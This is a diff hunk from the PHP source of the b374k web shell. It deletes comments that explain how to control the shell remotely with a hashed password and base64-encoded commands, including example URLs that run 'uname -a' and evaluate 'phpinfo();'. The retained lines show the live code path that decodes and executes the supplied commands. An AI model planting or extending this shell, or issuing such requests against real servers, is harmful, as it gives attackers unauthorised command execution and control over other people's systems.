@@ -62,18 +62,7 @@ if(strlen(trim($s_pass))>0){
 }
 else $s_auth = true;
 
-// This is a feature where you can control this script from another apps/scripts
-// you need to supply password (in sha1(md5()) format) to access this
-// this example using password 'b374k' in sha1(md5()) format (s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34)
-// give the code/command you want to execute in base64 format
-// this example using command 'uname -a' in base64 format (cmd=dW5hbWUgLWE=)
-// example:
-//		http://www.myserver.com/b374k.php?s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34&cmd=dW5hbWUgLWE=
-// next sample will evaluate php code 'phpinfo();' in base64 format (eval=cGhwaW5mbygpOw==)
-//		http://www.myserver.com/b374k.php?s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34&eval=cGhwaW5mbygpOw==
-// recommended ways is using POST DATA
-// note that it will not works if shell password is empty ($s_pass);
-// better see code below
+
 if(!empty($_GP['s_pass'])){
 	if(strtolower(trim($s_pass)) == strtolower(trim($_GP['s_pass']))){
 		if(isset($_GP['cmd'])) echo exe(base64_decode($_GP['cmd']));
